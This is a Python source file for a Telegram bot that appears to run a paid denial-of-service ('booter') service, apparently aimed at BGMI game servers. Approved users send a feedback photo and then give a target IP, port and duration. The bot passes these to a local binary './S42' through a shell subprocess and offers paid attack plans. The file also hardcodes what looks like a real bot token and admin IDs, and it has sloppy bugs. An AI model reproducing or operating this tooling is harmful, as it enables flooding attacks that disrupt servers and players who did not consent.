import telebot
import subprocess
import os
import datetime
import time
from threading import Thread
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Bot initialization
BOT_TOKEN = "7518021681:AAGfLpiLSXkcoL3XAoMs-z92uqNIoRZJjWM"  # Replace with your bot token
bot = telebot.TeleBot(BOT_TOKEN)

# Admin IDs
admin_id = ["6769245930"]  # Replace with your Telegram user ID

# File paths
USER_FILE = "users.txt"

# Constants
default_cooldown_time = 180  # Default cooldown time in seconds

# Variables
allowed_user_ids = []
last_attack_time = {}  # Track the time of the last attack for cooldown
active_attacks = {}  # Track active attack processes for each user

# Group ID (Replace with your group ID)
GROUP_ID = "-1002468429852"  # Replace with your Telegram group ID

# Global variable to store the user waiting for input after image submission
waiting_for_attack = {}

# Load allowed users from file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Save allowed users to file
def save_users():
    with open(USER_FILE, "w") as file:
        file.write("\n".join(allowed_user_ids))

# Command: /bgmi (Attack command with cooldown)
# Command: /bgmi (Attack command with cooldown)
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)

    # Check if the user has previously attacked
    if user_id in last_attack_time:
        # Calculate the time elapsed since the last attack
        elapsed_time = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
        
        # If the cooldown has not passed (200 seconds)
        if elapsed_time < 180:
            remaining_cooldown = 180 - int(elapsed_time)
            bot.reply_to(message, f"🥶 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡 𝗦𝗧𝗔𝗥𝗧 🥶 \n\n𝗘𝗡𝗗 𝗧𝗜𝗠𝗘 👉 {remaining_cooldown} 𝗦𝗘𝗖𝗢𝗡𝗗\n𝗕𝗘𝗙𝗢𝗥𝗘 𝗧𝗥𝗬 𝗡𝗘𝗪 𝗔𝗧𝗧𝗔𝗖𝗞\n\n𝚃𝚁𝚈 𝙰𝙽𝙾𝚃𝙷𝙴𝚁 𝙱𝙾𝚃 - /attack \n𝙴𝚡. /attack <𝚝𝚊𝚛𝚐𝚎𝚝> <𝚙𝚘𝚛𝚝> <𝚝𝚒𝚖𝚎> \n\n𝗦𝟰 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗚𝗥𝗣 🚩")
            return

    # Check if the user has sent an image and is now expected to provide attack details
    if user_id in waiting_for_attack and waiting_for_attack[user_id]:
        # The user has already submitted an image and is expected to provide attack details

        # Ensure the message follows the expected format
        command = message.text.split()
        if len(command) != 4:
            bot.reply_to(message, "‼️ 𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗙𝗢𝗥𝗠𝗔𝗧 ‼️\n\nᴾˡᵉᵃˢᵉ ᴾʳᵒᵛᵢᵈᵉ ʸᵒᵘʳ ᴬᵗᵗᵃᶜᵏ\n𝙴𝚡. /𝚊𝚝𝚝𝚊𝚌𝚔 <𝚝𝚊𝚛𝚐𝚎𝚝> <𝚙𝚘𝚛𝚝> <𝚝𝚒𝚖𝚎>\nΣX. /attack 12.3.45.6.0 12345 180\n\n𝗦𝟰 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗚𝗥𝗣 🚩")
            return

        target, port, duration = command[1], int(command[2]), int(command[3])

        # Validate the attack duration
        if duration > 180:
            bot.reply_to(message, "𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡 ⚠️ --> 𝟭𝟴𝟬")
            return

        # Perform the attack (same as the previous attack code logic)
        current_time = datetime.datetime.now()
        last_attack_time[user_id] = current_time  # Update the last attack time

        # Create a "Stop Attack" button
        markup = InlineKeyboardMarkup()
        stop_button = InlineKeyboardButton("Stop Attack", callback_data=f"stop:{user_id}")
        markup.add(stop_button)

        # Send attack start message with the "Stop Attack" button
        bot.reply_to(message, f"🩷 𝗔𝗧𝗧𝗔𝗖𝗞 𝟮 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 🩷\n\n☀️𝚃𝙰𝚁𝙶𝙴𝚃 - {target} \n☀️𝙿𝙾𝚁𝚃 {port} \n☀️𝚂𝙴𝙲𝙾𝙽𝙳𝚜 {duration}\n\n𝙰𝚃𝚃𝙰𝙲𝙺 𝙱𝚈 𝚂𝟺 𝙻𝚄𝙲𝙷𝙸\n𝗦𝟰 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗚𝗥𝗣 🚩", reply_markup=markup)

        # Run attack in a separate thread
        def execute_attack(user_id, target, port, duration):
            process = subprocess.Popen(f"./S42 {target} {port} {duration} 1000 ", shell=True)
            active_attacks[user_id] = process

            # Wait for the process to complete or for the duration to pass
            start_time = time.time()
            while time.time() - start_time < duration:
                if process.poll() is not None:  # Check if the process has finished early
                    break
                time.sleep(1)  # Check every second to avoid busy-waiting

            # Terminate the attack after the duration or if the process finishes
            process.terminate()
            active_attacks.pop(user_id, None)  # Remove the process from active attacks

            # Notify the user that the attack is finished
            bot.reply_to(message, f"🩵 𝘼𝙏𝙏𝘼𝘾𝙆 𝟮 𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿 🩵 \n\n🟡𝚃𝙰𝚁𝙶𝙴𝚃 - {target} \n🟡𝙿𝙾𝚁𝚃 {port} \n🟡𝚂𝙴𝙲𝙾𝙽𝙳𝚂 {duration}\n\n𝙰𝚝𝚝𝚊𝚌𝚔 𝙵𝚒𝚗𝚒𝚜𝚑𝚎𝚍 𝙱𝚢 𝚂𝟺\n𝗦𝟰 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗚𝗥𝗣 🚩 ")

        # Start the attack in a separate thread
        Thread(target=execute_attack, args=(user_id, target, port, duration)).start()

        # Clear the waiting state
        waiting_for_attack[user_id] = False
        
    else:
        bot.reply_to(message, "ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ꜰᴇᴇᴅʙᴀᴄᴋ ᴏꜰ \nʟᴀꜱᴛ ᴀᴛᴛᴀᴄᴋ ʙᴇꜰᴏʀᴇ ʀᴜɴ\nʏᴏᴜʀ ɴᴇxᴛ ᴀᴛᴛᴀᴄᴋ 😞\n\n𝗔𝗕 𝗧𝗢 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞 𝗗𝗘𝗡𝗔 𝗛𝗜 𝗣𝗔𝗗𝗘𝗚𝗔 😁")

# Load allowed users from file (This function reads the users.txt file)
import imagehash
from PIL import Image
import hashlib

# Dictionary to store previously uploaded image hashes
image_hashes = {}

# Helper function to get the hash of an image
def save_users():
    with open(USER_FILE, "w") as file:
        file.write("\n".join(allowed_user_ids))

# Helper function to get the hash of an image
def get_image_hash(image_data):
    image = Image.open(image_data)
    return imagehash.average_hash(image)

# Fix: Function to ensure safe file paths
def sanitize_filename(filename):
    return "".join(c for c in filename if c.isalnum() or c in (".", "_", "-")).rstrip()

# Bot photo handler (Fixes lstat: embedded null character in path)
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    try:
        user_id = str(message.chat.id)

        # Check if the user is allowed
        allowed_user_ids = read_users()
        if user_id not in allowed_user_ids:
            bot.reply_to(message, "❌ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 ❌")
            return

        # Get the file ID of the highest resolution photo
        file_id = message.photo[-1].file_id  
        file_info = bot.get_file(file_id)
        file_path = file_info.file_path

        # Sanitize file path before downloading
        safe_filename = sanitize_filename(os.path.basename(file_path))

        # Download the file
        downloaded_file = bot.download_file(file_path)

        # Save the file securely
        image_path = f"/tmp/{safe_filename}"
        with open(image_path, "wb") as file:
            file.write(downloaded_file)

        # Compute hash of the image
        image_hash = get_image_hash(image_path)

        # Check if the hash already exists
        if image_hash in image_hashes:
            bot.reply_to(message, "⚠️ 𝗨𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗲𝗲𝗱𝗯𝗮𝗰𝗸!")
            return
        
        # Store the hash for the current user
        image_hashes[image_hash] = user_id

        # Send the downloaded file to the group
        with open(image_path, "rb") as file:
            bot.send_photo(GROUP_ID, file)
        
        bot.reply_to(message, "𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞 𝗥𝗘𝗖𝗘𝗜𝗩𝗘𝗗 ✅ \n𝗡𝗢𝗪 𝗬𝗢𝗨 𝗖𝗔𝗡 𝗨𝗦𝗘 ✅")

        # Prompt user to provide attack details
        waiting_for_attack[user_id] = True
        bot.reply_to(message, "𝗧𝗛𝗔𝗡𝗞𝗦 𝗙𝗢𝗥 𝗣𝗥𝗢𝗩𝗜𝗗𝗜𝗡𝗚 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞")

    except Exception as e:
        bot.reply_to(message, f"Error ❌: {e}")



# Command to reset cooldown for a user (Admin only)
@bot.message_handler(commands=['user_cooldown'])
def reset_cooldown(message):
    if str(message.chat.id) in admin_id:
        try:
            user_id = message.text.split()[1]
            if user_id in last_attack_time:
                del last_attack_time[user_id]  # Remove the cooldown time for the user
                bot.reply_to(message, f"𝗨𝘀𝗲𝗿 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗥𝗲𝘀𝗲𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹 ✅")
            else:
                bot.reply_to(message, f"𝗨𝘀𝗲𝗿 𝗜𝗱 𝗡𝗢𝗧 𝗜𝗻 𝗨𝘀𝗲𝗿𝘀 𝗟𝗶𝘀𝘁")
        except IndexError:
            bot.reply_to(message, "𝗣𝗿𝗼𝘃𝗶𝗱𝗲 𝗨𝘀𝗲𝗿 𝗜𝗱")
    else:
        bot.reply_to(message, "ʏᴏᴜ ᴄᴀɴ ɴᴏᴛ 🚫 ʀᴇꜱᴇᴛ ᴜꜱᴇʀ ᴄᴏᴏʟᴅᴏᴡɴ")

# Command to reset cooldown for all users (Admin only)
@bot.message_handler(commands=['resetcooldown'])
def reset_all_cooldowns(message):
    if str(message.chat.id) in admin_id:
        last_attack_time.clear()  # Clear cooldowns for all users
        bot.reply_to(message, "✅ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗥𝗲𝘀𝗲𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹 𝗙𝗼𝗿 𝗔𝗹𝗹 ✅")
    else:
        bot.reply_to(message, "ʏᴏᴜ ᴄᴀɴ ɴᴏᴛ 🚫 ʀᴇꜱᴇᴛ ᴜꜱᴇʀ ᴄᴏᴏʟᴅᴏᴡɴ")

# Command: /plan
@bot.message_handler(commands=['plan'])
def show_plan(message):
    plan_text = (
        "𝗙𝗼𝗹𝗹𝗼𝘄𝗶𝗻𝗴 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘 𝗣𝗹𝗮𝗻𝘀✅:\n\n"
        "1️⃣ 𝟭 𝗗𝗮𝘆 𝗣𝗹𝗮𝗻: 𝟭𝟬𝟬 𝗥𝗨𝗣𝗘𝗘𝗦\n"
        "2️⃣ 𝟮 𝗗𝗮𝘆 𝗣𝗹𝗮𝗻: 𝟭𝟴𝟬 𝗥𝗨𝗣𝗘𝗘𝗦\n"
        "3️⃣ 𝟯 𝗗𝗮𝘆 𝗣𝗹𝗮𝗻: 𝟯𝟬𝟬 𝗥𝗨𝗣𝗘𝗘𝗦\n"
        "\nᴄʜᴏᴏꜱᴇ ᴀ ᴘʟᴀɴ ᴛᴏ ᴜᴘɢʀᴀᴅᴇ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ꜰᴏʀ ᴍᴏʀᴇ ᴀᴛ𝚝𝚊𝑐𝚔"
    )
    bot.reply_to(message, plan_text)

# Command to add a new user to allowed users
@bot.message_handler(commands=['approve'])
def add_user(message):
    if str(message.chat.id) in admin_id:
        user_id = message.text.split()[1]
        allowed_user_ids.append(user_id)
        save_users()
        bot.reply_to(message, f"𝗔𝗗𝗗𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟 ✅")
    else:
        bot.reply_to(message, "YOU CAN NOT ADD USERʂ🚫")

# Command to remove a user from allowed users
@bot.message_handler(commands=['disapprove'])
def remove_user(message):
    if str(message.chat.id) in admin_id:
        user_id = message.text.split()[1]
        if user_id in allowed_user_ids:
            allowed_user_ids.remove(user_id)
            save_users()
            bot.reply_to(message, f"𝗥𝗘𝗠𝗢𝗩𝗘 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟 ✅")
        else:
            bot.reply_to(message, "υׁׅ꯱ׁׅ֒ꫀׁׅܻꭈׁׅ ꪀׁׅᨵׁׅtׁׅ ⨍ᨵׁׅυׁׅꪀׁׅժׁׅ݊ ‼️")
    else:
        bot.reply_to(message, "𝚈𝙾𝚄 𝙲𝙰𝙽 𝙽𝙾𝚃 𝚁𝙴𝙼𝙾𝚅𝙴 𝚄𝚂𝙴𝚁𝚜🚫")

# Command to stop all active attacks
@bot.message_handler(commands=['stop_all'])
def stop_all_attacks(message):
    if str(message.chat.id) in admin_id:
        for user_id, process in active_attacks.items():
            process.terminate()
            active_attacks.pop(user_id, None)
        bot.reply_to(message, "𝗦𝗧𝗢𝗣𝗣𝗘𝗗 𝗔𝗟𝗟 𝗔𝗧𝗧𝗔𝗖𝗞𝗦 😎")
    else:
        bot.reply_to(message, "ʏᴏᴜ ᴄᴀɴ ɴᴏᴛ ꜱᴛᴏᴘ ᴀᴛᴛᴀᴄᴋꜱ ❌")

# Command to show help message
@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = (
        "𝔸𝕧𝕒𝕚𝕝𝕒𝕓𝕝𝕖 ℂ𝕠𝕞𝕞𝕒𝕟𝕕𝕤 👇👇👇\n\n"
        "❤️‍🔥 /bgmi ♦️ /approve 🏷️ /disapprove \n"
        "🙅 /stop_all 🤯 /resetcooldown\n"
        "☢️ /user_cooldown 🥶 /help 🥰 /plan\n\n"
        "    ❤️Owner - @S4_LUCHI  \n\n"
        "𝙵𝚞𝚕𝚕𝚢 𝚄𝚙𝚐𝚛𝚊𝚍𝚎𝚍 𝙱𝚘𝚝 𝙱𝚢 𝚂𝟺\n\n"
        "☠ 𝕤❹ ⓞғ𝔽ιᑕ𝐈𝓪Ｌ 𝔤ｒᵖ ☠"
    )
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    response = '''🙏 🇳 🇦 🇲 🇦 🇸 🇹 🇪 🙏'''
    bot.reply_to(message, response)
    
# Start the bot
bot.polling(none_stop=True)
